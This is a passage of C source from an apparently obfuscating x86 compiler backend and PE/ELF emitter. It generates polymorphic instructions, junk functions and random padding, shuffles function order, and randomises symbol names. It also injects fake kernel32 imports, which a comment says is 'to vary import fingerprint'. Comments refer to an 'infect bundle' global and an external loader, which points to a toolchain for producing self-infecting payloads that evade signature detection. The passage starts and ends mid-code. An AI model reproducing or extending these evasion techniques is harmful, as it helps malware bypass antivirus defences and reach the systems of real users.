                        }
                        emit_mov_rr(code, alt, rv);
                        rv = alt;
                    }

                    if (ins->dest.kind == VK_LOCAL) {
                        int offset = get_local_offset(cg, ins->dest.index);
                        if (need_byte) emit_mov_mr_disp_byte(code, REG_EBP, offset, rv);
                        else emit_mov_mr_disp(code, REG_EBP, offset, rv);
                    } else if (ins->dest.kind == VK_PARAM) {
                        int offset = get_param_offset(ins->dest.index);
                        if (need_byte) emit_mov_mr_disp_byte(code, REG_EBP, offset, rv);
                        else emit_mov_mr_disp(code, REG_EBP, offset, rv);
                    } else if (ins->dest.kind == VK_TEMP) {
                        int rp = ra_ensure_ex(cg, ins->dest.index, rv);
                        if (need_byte) emit_mov_mr_byte(code, rp, rv);
                        else emit_mov_mr(code, rp, rv);
                    } else if (ins->dest.kind == VK_GLOBAL) {
                        if (cg->pic_mode) {
                            emit_push(code, rv);
                            int addr_reg = ra_get_scratch(cg, rv, -1, -1);
                            emit_byte(code, 0xE8);
                            emit_u32(code, 0);
                            int base_pos = code->len;
                            emit_pop(code, addr_reg);
                            emit_byte(code, 0x81);
                            emit_byte(code, 0xC0 + addr_reg);
                            int fixup_pos = code->len;
                            emit_u32(code, 0);
                            add_glob_fixup(cg, fixup_pos, ins->dest.index, base_pos);
                            emit_pop(code, rv);
                            emit_mov_mr(code, addr_reg, rv);
                        } else if (cg->abs_mode) {
                            // Absolute mode: MOV [disp32], reg — direct memory store
                            // Encoding: 89 ModRM(00,reg,101) disp32
                            int store_byte = need_byte;
                            emit_byte(code, store_byte ? 0x88 : 0x89);
                            emit_byte(code, modrm(0, rv, 5));  // mod=00, rm=101 = [disp32]
                            int fixup_pos = code->len;
                            emit_u32(code, 0);  // placeholder
                            add_abs_data_fixup(cg, fixup_pos, cg->global_offsets[ins->dest.index]);
                        } else {
                            int addr_reg = ra_get_scratch(cg, rv, -1, -1);
                            emit_mov_ri(code, addr_reg, cg->global_offsets[ins->dest.index]);
                            emit_mov_mr(code, addr_reg, rv);
                        }
                    }
                    break;
                }

                case 66: // ADDR
                {
                    int rd = ra_def(cg, ins->dest.index, -1, -1);
                    if (ins->src1.kind == VK_GLOBAL) {
                        if (cg->pic_mode) {
                            emit_byte(code, 0xE8);
                            emit_u32(code, 0);
                            int base_pos = code->len;
                            emit_pop(code, rd);
                            emit_byte(code, 0x81);
                            emit_byte(code, 0xC0 + rd);
                            int fixup_pos = code->len;
                            emit_u32(code, 0);
                            add_glob_fixup(cg, fixup_pos, ins->src1.index, base_pos);
                        } else if (cg->abs_mode) {
                            // Absolute mode: MOV reg, imm32 (absolute address of global)
                            emit_mov_ri(code, rd, 0);  // placeholder
                            add_abs_data_fixup(cg, code->len - 4, cg->global_offsets[ins->src1.index]);
                        } else {
                            emit_mov_ri(code, rd, cg->global_offsets[ins->src1.index]);
                        }
                    } else {
                        int offset = 0;
                        if (ins->src1.kind == VK_LOCAL) offset = get_local_offset(cg, ins->src1.index);
                        else if (ins->src1.kind == VK_PARAM) offset = get_param_offset(ins->src1.index);
                        emit_byte(code, 0x8D);  // LEA
                        emit_byte(code, modrm(2, rd, REG_EBP));
                        emit_u32(code, offset);
                    }
                    break;
                }

                case 67: // PTRADD — dest = src1 + src2 * elem_size
                {
                    int r1 = ra_load_src(cg, &ins->src1);
                    int r2 = ra_load_src_ex(cg, &ins->src2, r1);
                    int rd = ra_def(cg, ins->dest.index, r1, r2);
                    if (ins->elem_size > 1) {
                        // Always use a scratch for the index*elem_size to avoid clobbering r2
                        int ri = ra_get_scratch(cg, rd, r1, r2);
                        // IMUL ri, r2, elem_size (3-operand form)
                        emit_byte(code, 0x6B);
                        emit_byte(code, modrm(3, ri, r2));
                        emit_byte(code, ins->elem_size);
                        if (rd == r1) {
                            emit_byte(code, 0x01);  // ADD rd, ri
                            emit_byte(code, modrm(3, ri, rd));
                        } else if (rd == r2) {
                            emit_mov_rr(code, rd, r1);
                            emit_byte(code, 0x01);
                            emit_byte(code, modrm(3, ri, rd));
                        } else {
                            emit_mov_rr(code, rd, r1);
                            emit_byte(code, 0x01);
                            emit_byte(code, modrm(3, ri, rd));
                        }
                    } else {
                        if (rd == r1) {
                            emit_byte(code, 0x01);
                            emit_byte(code, modrm(3, r2, rd));
                        } else if (rd == r2) {
                            emit_byte(code, 0x01);  // ADD is commutative
                            emit_byte(code, modrm(3, r1, rd));
                        } else {
                            emit_mov_rr(code, rd, r1);
                            emit_byte(code, 0x01);
                            emit_byte(code, modrm(3, r2, rd));
                        }
                    }
                    break;
                }

                case 68: // FIELDPTR
                {
                    int r1 = ra_load_src(cg, &ins->src1);
                    int rd = ra_def(cg, ins->dest.index, r1, -1);
                    if (rd != r1) emit_mov_rr(code, rd, r1);
                    if (ins->offset != 0) emit_add_ri(code, rd, ins->offset);
                    break;
                }

                case 69: // ALLOCA
                {
                    int size = ins->offset;
                    size = (size + 3) & ~3;
                    emit_sub_ri(code, REG_ESP, size);
                    int rd = ra_def(cg, ins->dest.index, -1, -1);
                    emit_mov_rr(code, rd, REG_ESP);
                    break;
                }

                case 80: // JMP
                {
                    ra_spill_all(cg);
                    if (ins->target_block <= b) {
                        int target = cg->block_offsets[ins->target_block];
                        int rel = target - (code->len + 5);
                        emit_jmp_rel(code, rel);
                    } else {
                        add_fixup(cg, code->len + 1, ins->target_block, 5);
                        emit_jmp_rel(code, 0);
                    }
                    break;
                }

                case 81: // JZ
                {
                    int r1 = ra_load_src(cg, &ins->src1);
                    emit_test_rr(code, r1, r1);
                    ra_spill_all(cg);  // MOV spills don't affect flags
                    if (ins->target_block <= b) {
                        int target = cg->block_offsets[ins->target_block];
                        int rel = target - (code->len + 6);
                        emit_jcc_rel(code, CC_E, rel);
                    } else {
                        add_fixup(cg, code->len + 2, ins->target_block, 6);
                        emit_jcc_rel(code, CC_E, 0);
                    }
                    break;
                }

                case 82: // JNZ
                {
                    int r1 = ra_load_src(cg, &ins->src1);
                    emit_test_rr(code, r1, r1);
                    ra_spill_all(cg);
                    if (ins->target_block <= b) {
                        int target = cg->block_offsets[ins->target_block];
                        int rel = target - (code->len + 6);
                        emit_jcc_rel(code, CC_NE, rel);
                    } else {
                        add_fixup(cg, code->len + 2, ins->target_block, 6);
                        emit_jcc_rel(code, CC_NE, 0);
                    }
                    break;
                }

                // Comparisons: CMP + conditional jump + MOV
                case 48: // EQ
                case 49: // NE
                case 50: // LT
                case 51: // LE
                case 52: // GT
                case 53: // GE
                {
                    int r1 = ra_load_src(cg, &ins->src1);
                    int r2 = ra_load_src_ex(cg, &ins->src2, r1);
                    if (cg->x86.poly_instrs) {
                        int scr = ra_get_scratch(cg, r1, r2, -1);
                        emit_cmp_poly(code, r1, r2, scr, cg->prng);
                    } else {
                        emit_cmp_rr(code, r1, r2);
                    }
                    // Ensure EAX is available for result
                    if (cg->ra_alloc[REG_EAX] >= 0 &&
                        !(ins->dest.kind == VK_TEMP && cg->ra_alloc[REG_EAX] == ins->dest.index)) {
                        ra_spill_reg(cg, REG_EAX);
                    }
                    // Select condition code
                    int cmp_cc;
                    switch (ins->opcode) {
                        case 48: cmp_cc = CC_E;  break; // EQ
                        case 49: cmp_cc = CC_NE; break; // NE
                        case 50: cmp_cc = CC_L;  break; // LT
                        case 51: cmp_cc = CC_LE; break; // LE
                        case 52: cmp_cc = CC_G;  break; // GT
                        default: cmp_cc = CC_GE; break; // GE
                    }
                    emit_mov_ri(code, REG_EAX, 0);  // doesn't affect flags
                    emit_jcc_short(code, cmp_cc ^ 1, 5);  // skip MOV EAX,1 if false
                    emit_mov_ri(code, REG_EAX, 1);
                    // Assign EAX to dest
                    if (ins->dest.kind == VK_TEMP) {
                        cg->ra_alloc[REG_EAX] = ins->dest.index;
                        cg->ra_temp_reg[ins->dest.index] = REG_EAX;
                        cg->ra_dirty[ins->dest.index] = 1;
                    }
                    break;
                }

                case 96: // CALL
                {
                    gen_call_common(cg, ins, 1);
                    break;
                }

                case 97: // CALLV (void call)
                {
                    gen_call_common(cg, ins, 0);
                    break;
                }

                case 100: // ICALL (indirect call with return)
                {
                    gen_icall_common(cg, ins, 1);
                    break;
                }

                case 101: // ICALLV (indirect void call)
                {
                    gen_icall_common(cg, ins, 0);
                    break;
                }

                case 103: // SYSCALL — Linux INT 0x80
                {
                    gen_syscall_common(cg, ins);
                    break;
                }

                case 98: // RET
                {
                    if (ins->src1.kind == VK_TEMP) {
                        ra_force(cg, ins->src1.index, REG_EAX);
                    } else {
                        if (cg->ra_alloc[REG_EAX] >= 0) ra_spill_reg(cg, REG_EAX);
                        load_operand(cg, &ins->src1, REG_EAX);
                    }
                    emit_pop(code, REG_EDI);
                    emit_pop(code, REG_ESI);
                    emit_pop(code, REG_EBX);
                    emit_mov_rr(code, REG_ESP, REG_EBP);
                    emit_pop(code, REG_EBP);
                    emit_ret(code);
                    block_returned = 1;
                    break;
                }

                case 99: // RETV
                    emit_pop(code, REG_EDI);
                    emit_pop(code, REG_ESI);
                    emit_pop(code, REG_EBX);
                    emit_mov_rr(code, REG_ESP, REG_EBP);
                    emit_pop(code, REG_EBP);
                    emit_ret(code);
                    block_returned = 1;
                    break;

                case 102: // FUNC_ADDR — get code address of a function
                {
                    int rd = ra_def(cg, ins->dest.index, -1, -1);
                    // E8 00 00 00 00  CALL next
                    emit_byte(code, 0xE8);
                    emit_u32(code, 0);
                    // 58+rd           POP rd  (rd = address of this POP instruction)
                    emit_pop(code, rd);
                    // 81 C0+rd imm32  ADD rd, imm32
                    emit_byte(code, 0x81);
                    emit_byte(code, 0xC0 + rd);
                    add_faddr_fixup(cg, code->len, ins->func_idx);
                    emit_u32(code, 0);
                    break;
                }

                case 112: // EMIT
                    for (int rk = 0; rk < ins->raw_count; rk++)
                        emit_byte(code, ins->raw_bytes[rk]);
                    break;

                default:
                    emit_byte(code, 0x90);
                    break;
            }
            annot_real(_instr_start, code->len - _instr_start, get_opname(ins->opcode));

            // Free dead temps and clear scratch markers (skip after RET — unreachable)
            if (!block_returned) {
                ra_free_dead(cg);
                ra_clear_scratch(cg);
            }
        }

        // Control-flow instructions (JMP/JZ/JNZ/RET/RETV) call ra_spill_all
        // internally, so no explicit block-end spill is needed.
    }

    annot_end_func(code->len);

    // Apply fixups for forward jumps
    for (int f = 0; f < cg->fixup_count; f++) {
        int patch_pos = cg->fixup_offsets[f];
        int target_block = cg->fixup_targets[f];
        int target = cg->block_offsets[target_block];
        int instruction_end = patch_pos + 4;
        int rel = target - instruction_end;
        code->data[patch_pos] = rel & 0xFF;
        code->data[patch_pos + 1] = (rel >> 8) & 0xFF;
        code->data[patch_pos + 2] = (rel >> 16) & 0xFF;
        code->data[patch_pos + 3] = (rel >> 24) & 0xFF;
    }

    free(cg->block_offsets);
    cg->block_offsets = NULL;
    ra_free_func(cg);
}

// Randomize internal names in the string table (function names, labels, etc.)
void randomize_names(struct Module* mod, struct Prng* prng) {
    int* prot = (int*)calloc(mod->string_count + 1, sizeof(int));

    // Protect VK_STRING references (actual string literals used in code)
    for (int f = 0; f < mod->func_count; f++) {
        struct Function* func = &mod->funcs[f];
        for (int b = 0; b < func->block_count; b++) {
            struct Block* blk = &func->blocks[b];
            for (int i = 0; i < blk->instr_count; i++) {
                struct Instruction* ins = &blk->instrs[i];
                if (ins->dest.kind == VK_STRING) prot[ins->dest.index] = 1;
                if (ins->src1.kind == VK_STRING) prot[ins->src1.index] = 1;
                if (ins->src2.kind == VK_STRING) prot[ins->src2.index] = 1;
                for (int a = 0; a < ins->arg_count; a++) {
                    if (ins->args[a].kind == VK_STRING) prot[ins->args[a].index] = 1;
                }
            }
        }
    }

    // Protect extern function names and DLL names
    for (int f = 0; f < mod->func_count; f++) {
        struct Function* func = &mod->funcs[f];
        if (func->block_count == 0) {
            prot[func->name_idx] = 1;
            if (func->dll_idx > 0) prot[func->dll_idx] = 1;
        }
    }

    // Protect entry function name ("main")
    prot[mod->funcs[mod->entry_func].name_idx] = 1;

    // Protect global string init values (init_kind == 2 means string ref) and
    // global variable names themselves — emit_globals does strcmp lookups on
    // names like "g_bundle_header" / "g_infect_bundle" to record their
    // data-section offsets, so the names must survive randomization.
    for (int g = 0; g < mod->global_count; g++) {
        if (mod->globals[g].init_kind == 2) {
            prot[mod->globals[g].init_value] = 1;
        }
        prot[mod->globals[g].name_idx] = 1;
    }

    // Save old string pointers (for block label fixup)
    char** old_strings = (char**)malloc(sizeof(char*) * mod->string_count);
    for (int i = 0; i < mod->string_count; i++) {
        old_strings[i] = mod->strings[i];
    }

    // Replace unprotected strings with random names
    for (int i = 0; i < mod->string_count; i++) {
        if (!prot[i]) {
            int len = 7;
            char* new_name = (char*)malloc(len + 1);
            new_name[0] = 'r';
            for (int j = 1; j < len; j++) {
                int r = prng_range(prng, 16);
                if (r < 10) new_name[j] = '0' + r;
                else new_name[j] = 'a' + (r - 10);
            }
            new_name[len] = 0;
            mod->strings[i] = new_name;
        }
    }

    // Update function name pointers
    for (int f = 0; f < mod->func_count; f++) {
        mod->funcs[f].name = mod->strings[mod->funcs[f].name_idx];
    }

    // Update global name pointers
    for (int g = 0; g < mod->global_count; g++) {
        mod->globals[g].name = mod->strings[mod->globals[g].name_idx];
    }

    // Update block label pointers (find by old pointer match)
    for (int f = 0; f < mod->func_count; f++) {
        struct Function* func = &mod->funcs[f];
        for (int b = 0; b < func->block_count; b++) {
            for (int s = 0; s < mod->string_count; s++) {
                if (func->blocks[b].label == old_strings[s]) {
                    func->blocks[b].label = mod->strings[s];
                    break;
                }
            }
        }
    }

    // Free old unprotected strings
    for (int i = 0; i < mod->string_count; i++) {
        if (!prot[i]) free(old_strings[i]);
    }
    free(old_strings);
    free(prot);
}

// Scan module to find which strings are actually used by code
void scan_used_strings(struct CodeGen* cg, int* used) {
    struct Module* mod = cg->mod;
    // Initialize all as unused
    for (int i = 0; i < mod->string_count; i++) {
        used[i] = 0;
    }
    // Scan all functions for VK_STRING operands
    for (int f = 0; f < mod->func_count; f++) {
        struct Function* func = &mod->funcs[f];
        for (int b = 0; b < func->block_count; b++) {
            struct Block* blk = &func->blocks[b];
            for (int i = 0; i < blk->instr_count; i++) {
                struct Instruction* ins = &blk->instrs[i];
                // Check all operand positions for VK_STRING
                if (ins->dest.kind == VK_STRING) used[ins->dest.index] = 1;
                if (ins->src1.kind == VK_STRING) used[ins->src1.index] = 1;
                if (ins->src2.kind == VK_STRING) used[ins->src2.index] = 1;
                // Check call arguments
                for (int a = 0; a < ins->arg_count; a++) {
                    if (ins->args[a].kind == VK_STRING) {
                        used[ins->args[a].index] = 1;
                    }
                }
            }
        }
    }
}

void emit_strings(struct CodeGen* cg) {
    // Only emit strings that are actually used by code
    struct Module* mod = cg->mod;
    int* used = (int*)malloc(sizeof(int) * (mod->string_count + 1));
    scan_used_strings(cg, used);

    for (int i = 0; i < mod->string_count; i++) {
        if (used[i]) {
            cg->string_offsets[i] = cg->data->len;
            char* str = mod->strings[i];
            int len = 0;
            while (str[len]) len++;
            buf_write_bytes(cg->data, str, len + 1);  // Include null terminator
        } else {
            // Mark unused strings with invalid offset
            cg->string_offsets[i] = -1;
        }
    }
    free(used);
}

void emit_globals(struct CodeGen* cg) {
    // Emit global variables to data section (after strings)
    struct Module* mod = cg->mod;
    for (int i = 0; i < mod->global_count; i++) {
        // Align to 4 bytes for efficiency
        while (cg->data->len % 4 != 0) {
            buf_write_u8(cg->data, 0);
        }
        cg->global_offsets[i] = cg->data->len;
        // Write initial value, padded to full size for arrays
        struct Global* g = &mod->globals[i];
        if (g->size == 1) {
            buf_write_u8(cg->data, g->init_value & 0xFF);
        } else if (g->size <= 4) {
            buf_write_u32(cg->data, g->init_value);
        } else {
            // Array global: write init_value for first 4 bytes, zero for the rest
            buf_write_u32(cg->data, g->init_value);
            for (int pad = 4; pad < g->size; pad++) buf_write_u8(cg->data, 0);
        }
    }
}

void gen_module(struct CodeGen* cg) {
    // Emit strings to data section first (so we know offsets)
    emit_strings(cg);
    // Emit globals to data section (after strings)
    emit_globals(cg);

    // In PIC mode, reserve space for API table pointer at offset 0
    // Format: [JMP over slot][API table ptr slot]
    // PIC setup: JMP over API table slot (+ random padding when transforms active)
    // Skip in scatter mode — no API table needed
    if (cg->pic_mode && !cg->abs_mode) {
        int any_x86 = cg->x86.poly_instrs || cg->x86.dead_code || cg->x86.opaque ||
                       cg->x86.junk_funcs || cg->x86.harmless_calls || cg->x86.shuffle_funcs;
        int pad = any_x86 ? prng_range(cg->prng, 8) * 2 : 0;
        emit_byte(cg->code, 0xEB);            // JMP short
        emit_byte(cg->code, 4 + pad);         // skip slot + padding
        cg->api_slot_offset = cg->code->len;  // Slot at offset 2
        if (any_x86) {
            // Fill slot with random junk (loader overwrites it)
            for (int _j = 0; _j < 4; _j++) emit_byte(cg->code, prng_range(cg->prng, 256));
            // Random padding after slot
            for (int _j = 0; _j < pad; _j++) emit_byte(cg->code, prng_range(cg->prng, 256));
        } else {
            emit_byte(cg->code, 0); emit_byte(cg->code, 0);
            emit_byte(cg->code, 0); emit_byte(cg->code, 0);
        }
    }

    // Find injected harmless extern APIs for junk/dead-code calls
    find_harmless_apis(cg);

    // Count non-extern (real) functions
    int real_func_count = 0;
    for (int i = 0; i < cg->mod->func_count; i++) {
        if (cg->mod->funcs[i].block_count > 0) real_func_count++;
    }

    // Determine junk function count (proportional to real function count)
    if (cg->x86.junk_funcs) {
        int pct = get_genome()->junk_func_pct;
        cg->junk_func_count = real_func_count * pct / 100;
        if (cg->junk_func_count < 1) cg->junk_func_count = 1;
    } else {
        cg->junk_func_count = 0;
    }
    cg->junk_func_offsets = (int*)malloc(sizeof(int) * (cg->junk_func_count + 1));

    // Build generation order (non-extern functions + junk)
    int* gen_order = (int*)malloc(sizeof(int) * (cg->mod->func_count + cg->junk_func_count));
    int gen_count = 0;
    for (int i = 0; i < cg->mod->func_count; i++) {
        if (cg->mod->funcs[i].block_count > 0) {
            gen_order[gen_count++] = i;
        }
    }

    // Add junk function entries as negative sentinel values: -(junk_idx + 1)
    int total_count = gen_count;
    for (int gi = 0; gi < cg->junk_func_count; gi++) {
        gen_order[total_count++] = -(gi + 1);
    }

    // Fisher-Yates shuffle entire gen_order (real + junk mixed)
    if (cg->x86.shuffle_funcs && total_count > 1) {
        for (int i = total_count - 1; i > 0; i--) {
            int j = prng_next(cg->prng) % (i + 1);
            int tmp = gen_order[i];
            gen_order[i] = gen_order[j];
            gen_order[j] = tmp;
        }
    }

    // Generate functions in (possibly shuffled) order
    int dump_offsets = (getenv("DUMP_OFFSETS") != NULL);
    for (int i = 0; i < total_count; i++) {
        if (gen_order[i] >= 0) {
            int fi = gen_order[i];
            cg->func_offsets[fi] = cg->code->len;
            int start = cg->code->len;
            gen_function(cg, &cg->mod->funcs[fi], fi);
            if (dump_offsets) {
                fprintf(stderr, "[FN] %s start=0x%x end=0x%x size=%d\n",
                        cg->mod->funcs[fi].name, start, cg->code->len, cg->code->len - start);
            }
        } else {
            int gi = -(gen_order[i] + 1);
            gen_junk_function(cg, gi);
        }
    }

    free(gen_order);

    // Resolve call fixups
    for (int i = 0; i < cg->call_fixup_count; i++) {
        int fixup_pos = cg->call_fixup_offsets[i];
        int target = cg->func_offsets[cg->call_fixup_targets[i]];
        int rel = target - (fixup_pos + 4);
        buf_patch_u32(cg->code, fixup_pos, rel);
    }
    free(cg->call_fixup_offsets);
    free(cg->call_fixup_targets);
    cg->call_fixup_offsets = NULL;
    cg->call_fixup_targets = NULL;
    cg->call_fixup_count = 0;

    // Resolve func addr fixups
    for (int i = 0; i < cg->faddr_fixup_count; i++) {
        int fixup_pos = cg->faddr_fixup_offsets[i];
        int target = cg->func_offsets[cg->faddr_fixup_targets[i]];
        // POP puts address of the POP instruction in the register.
        // POP is 1 byte, ADD opcode is 2 bytes, then the imm32 is at fixup_pos.
        // So POP address = fixup_pos - 3 (relative to code start).
        // imm32 = func_offset - (fixup_pos - 3)
        int imm = target - (fixup_pos - 3);
        buf_patch_u32(cg->code, fixup_pos, imm);
    }
    free(cg->faddr_fixup_offsets);
    free(cg->faddr_fixup_targets);
    cg->faddr_fixup_offsets = NULL;
    cg->faddr_fixup_targets = NULL;
    cg->faddr_fixup_count = 0;

    // Resolve junk call fixups
    for (int i = 0; i < cg->junk_call_fixup_count; i++) {
        int fixup_pos = cg->junk_call_fixup_offsets[i];
        int target = cg->junk_func_offsets[cg->junk_call_fixup_targets[i]];
        int rel = target - (fixup_pos + 4);
        buf_patch_u32(cg->code, fixup_pos, rel);
    }
    free(cg->junk_call_fixup_offsets);
    free(cg->junk_call_fixup_targets);
    free(cg->junk_func_offsets);
    free(cg->harmless_api_indices);
    cg->junk_call_fixup_offsets = NULL;
    cg->junk_call_fixup_targets = NULL;
    cg->junk_call_fixup_count = 0;

    // Apply string fixups now that we know code_size
    int code_size = cg->code->len;
    for (int i = 0; i < cg->str_fixup_count; i++) {
        int fixup_pos = cg->str_fixup_offsets[i];
        int str_idx = cg->str_fixup_indices[i];
        int base_pos = cg->str_fixup_bases[i];
        // The displacement is: code_size - base_pos + string_offset
        // After pop, dst_reg points to base_pos in the executing code
        // We add displacement to get: base_pos + code_size - base_pos + string_offset = code_size + string_offset
        // Which is the address of the string (since data follows code)
        int displacement = code_size - base_pos + cg->string_offsets[str_idx];
        buf_patch_u32(cg->code, fixup_pos, displacement);
    }

    // Apply global fixups now that we know code_size
    for (int i = 0; i < cg->glob_fixup_count; i++) {
        int fixup_pos = cg->glob_fixup_offsets[i];
        int glob_idx = cg->glob_fixup_indices[i];
        int base_pos = cg->glob_fixup_bases[i];
        // The displacement is: code_size - base_pos + global_offset
        int displacement = code_size - base_pos + cg->global_offsets[glob_idx];
        buf_patch_u32(cg->code, fixup_pos, displacement);
    }
}

// =============================================================================
//
// Assemble Module
//
// Contains the following sections:
//   1. Standalone PE emitter (absolute addressing, real IAT)
//   2. Standalone ELF emitter (absolute addressing, raw syscalls)
//
// =============================================================================

// ===== Standalone PE emitter (absolute addressing, real IAT) =====

// Helper: write a little-endian u32 into a byte array at offset
static void pe_put32(unsigned char* buf, int offset, int value) {
    buf[offset]   = value & 0xFF;
    buf[offset+1] = (value >> 8)  & 0xFF;
    buf[offset+2] = (value >> 16) & 0xFF;
    buf[offset+3] = (value >> 24) & 0xFF;
}

// Helper: write a little-endian u16 into a byte array at offset
static void pe_put16(unsigned char* buf, int offset, int value) {
    buf[offset]   = value & 0xFF;
    buf[offset+1] = (value >> 8) & 0xFF;
}

// Info about one PE import (internal kernel32 API or user extern)
struct PeImport {
    const char* dll_name;
    const char* func_name;
};


// Build cdecl-to-stdcall bridge wrappers. All wrappers are cdecl (caller cleans args).
// wrapper_offsets[api_slot] = offset within returned Buffer.
// fixups: pairs of (buf_offset, import_idx) for IAT address patching.
// Emit 0-2 junk instructions into a wrapper buffer (polymorphic wrappers)
static void emit_wrapper_junk_c(struct Buffer* wb, unsigned int* rng) {
    *rng = *rng * 1103515245 + 12345;
    int kind = (*rng >> 16) % 6;
    if (kind == 0) return;
    if (kind == 1) { buf_write_u8(wb, 0x90); return; }  // NOP
    if (kind == 2) { buf_write_u8(wb, 0x87); buf_write_u8(wb, 0xC0); return; } // XCHG EAX,EAX
    if (kind == 3) { // PUSH/POP
        *rng = *rng * 1103515245 + 12345;
        int r = (*rng >> 16) % 3;
        if (r == 0) { buf_write_u8(wb, 0x53); buf_write_u8(wb, 0x5B); }
        else if (r == 1) { buf_write_u8(wb, 0x56); buf_write_u8(wb, 0x5E); }
        else { buf_write_u8(wb, 0x57); buf_write_u8(wb, 0x5F); }
        return;
    }
    if (kind == 4) { buf_write_u8(wb, 0x8D); buf_write_u8(wb, 0x49); buf_write_u8(wb, 0x00); return; } // LEA ECX,[ECX+0]
    buf_write_u8(wb, 0x90); buf_write_u8(wb, 0x90); // 2x NOP
}

// Build standalone PE with direct IAT calls (no wrapper stubs).
void write_pe_standalone(struct CodeGen* cg, int entry_offset, const char* filename) {
    struct Module* mod = cg->mod;
    struct Buffer* code = cg->code;
    struct Buffer* data = cg->data;

    int image_base = 0x00400000;
    int section_align = 0x1000;
    int file_align = 0x200;
    int text_rva = 0x1000;

    // --- Step 1: Collect all imports from module externs ---
    int max_slot = 0;
    for (int i = 0; i < mod->func_count; i++) {
        if (mod->funcs[i].block_count == 0 && mod->funcs[i].api_slot + 1 > max_slot)
            max_slot = mod->funcs[i].api_slot + 1;
    }

    struct PeImport* imports = (struct PeImport*)malloc(sizeof(struct PeImport) * (max_slot + 1));
    int import_count = 0;
    int* slot_to_import = (int*)calloc(max_slot + 1, sizeof(int));
    for (int s = 0; s <= max_slot; s++) slot_to_import[s] = -1;

    // Add all externs with DLL names, ordered by api_slot
    for (int slot = 0; slot < max_slot; slot++) {
        for (int i = 0; i < mod->func_count; i++) {
            if (mod->funcs[i].block_count == 0 && mod->funcs[i].api_slot == slot) {
                const char* dn = mod->funcs[i].dll_name;
                if (!dn || dn[0] == 0) break;  // skip externs without DLL
                // Skip Linux/non-Windows DLLs
                if (dn[0]=='l' && dn[1]=='i' && dn[2]=='b' && dn[3]=='c' && dn[4]=='.') break;
                slot_to_import[slot] = import_count;
                imports[import_count].dll_name = dn;
                imports[import_count].func_name = mod->funcs[i].name;
                import_count++;
                break;
            }
        }
    }

    // --- Step 2: Inject fake kernel32 externs to vary import fingerprint ---
    {
        static const char* fake_pool[] = {
            "GetTempPathA","SetFilePointer","GetSystemTime","GetLocalTime",
            "GetSystemTimeAsFileTime","QueryPerformanceCounter",
            "QueryPerformanceFrequency","GetSystemInfo","GetVersionExA",
            "GetComputerNameA","GetUserDefaultLCID","GetACP","GetOEMCP",
            "IsValidCodePage","GetLocaleInfoA","GetTimeZoneInformation",
            "GetEnvironmentVariableA","GetModuleHandleA","GetStartupInfoA",
            "SetLastError","FlsAlloc","FlsGetValue","FlsSetValue",
            "TlsAlloc","TlsGetValue","TlsSetValue",
            "InitializeCriticalSection","DeleteCriticalSection",
            "EnterCriticalSection","LeaveCriticalSection",
            "HeapSize","GlobalAlloc","GlobalFree","LocalAlloc","LocalFree",
            "GetCurrentDirectoryA","SetCurrentDirectoryA","GetDiskFreeSpaceA",
            "FindFirstFileA","FindClose","GetFileAttributesA",
            "GetConsoleMode","SetConsoleMode",
            "GetNumberOfConsoleInputEvents","OutputDebugStringA",
        };
        int pool_size = sizeof(fake_pool) / sizeof(fake_pool[0]);
        int n_fakes = prng_range(cg->prng, 16) + 5;
        int added = 0, attempts = 0;
        imports = realloc(imports, sizeof(struct PeImport) * (max_slot + 1 + n_fakes));
        while (added < n_fakes && attempts < 100) {
            int idx = prng_range(cg->prng, pool_size);
            const char* fname = fake_pool[idx];
            // Check for duplicates
            int dup = 0;
            for (int k = 0; k < import_count; k++) {
                if (strcmp(imports[k].func_name, fname) == 0) { dup = 1; break; }
            }
            if (!dup) {
                imports[import_count].dll_name = "kernel32.dll";
                imports[import_count].func_name = fname;
                import_count++;
                added++;
            }
            attempts++;
        }
        /* fake externs injected */
    }

    // --- Step 3: Group imports by DLL, build .idata ---
    const char* dlls[64];
    int dll_count = 0;
    for (int i = 0; i < import_count; i++) {
        int found = 0;
        for (int d = 0; d < dll_count; d++) {
            if (strcmp(imports[i].dll_name, dlls[d]) == 0) { found = 1; break; }
        }
        if (!found) dlls[dll_count++] = imports[i].dll_name;
    }

    struct Buffer* idata = buf_new(1024);
    int idt_size = (dll_count + 1) * 20;
    int ilt_total = 0, iat_total = 0;
    for (int d = 0; d < dll_count; d++) {
        int n = 0;
        for (int i = 0; i < import_count; i++)
            if (strcmp(imports[i].dll_name, dlls[d]) == 0) n++;
        ilt_total += (n + 1) * 4;
        iat_total += (n + 1) * 4;
    }
    int ilt_start = idt_size;
    int iat_start = ilt_start + ilt_total;
    int hn_start = iat_start + iat_total;

    // Write placeholders for IDT + ILT + IAT
    for (int i = 0; i < hn_start; i++) buf_write_u8(idata, 0);

    // Hint/Name entries
    int* hn_offsets = (int*)malloc(sizeof(int) * import_count);
    for (int i = 0; i < import_count; i++) {
        hn_offsets[i] = idata->len;
        buf_write_u16(idata, 0);
        const char* name = imports[i].func_name;
        int nlen = 0; while (name[nlen]) nlen++;
        buf_write_bytes(idata, name, nlen + 1);
        if ((nlen + 1) % 2 != 0) buf_write_u8(idata, 0);
    }

    // DLL name strings
    int* dll_name_offsets = (int*)malloc(sizeof(int) * dll_count);
    for (int d = 0; d < dll_count; d++) {
        dll_name_offsets[d] = idata->len;
        const char* name = dlls[d];
        int nlen = 0; while (name[nlen]) nlen++;
        buf_write_bytes(idata, name, nlen + 1);
    }

    // Compute layout (no wrappers — code uses CALL [IAT] directly)
    int data_rva = text_rva + ((code->len + section_align - 1) / section_align) * section_align;
    int idata_rva = data_rva + ((data->len > 0 ? ((data->len + section_align - 1) / section_align) * section_align : section_align));

    // --- Step 4: Fill IDT, ILT, IAT + compute IAT absolute addresses ---
    int* iat_abs = (int*)malloc(sizeof(int) * import_count);  // iat_abs[import_idx]
    int ilt_off = ilt_start;
    int iat_off = iat_start;

    for (int d = 0; d < dll_count; d++) {
        int idt_entry = d * 20;
        pe_put32(idata->data, idt_entry + 0, idata_rva + ilt_off);
        pe_put32(idata->data, idt_entry + 12, idata_rva + dll_name_offsets[d]);
        pe_put32(idata->data, idt_entry + 16, idata_rva + iat_off);

        for (int i = 0; i < import_count; i++) {
            if (strcmp(imports[i].dll_name, dlls[d]) != 0) continue;
            int hn_rva = idata_rva + hn_offsets[i];
            pe_put32(idata->data, ilt_off, hn_rva);
            pe_put32(idata->data, iat_off, hn_rva);
            iat_abs[i] = image_base + idata_rva + iat_off;
            ilt_off += 4;
            iat_off += 4;
        }
        ilt_off += 4;  // null terminator
        iat_off += 4;
    }

    // --- Step 5: Resolve user code abs fixups ---
    for (int i = 0; i < cg->abs_data_fixup_count; i++) {
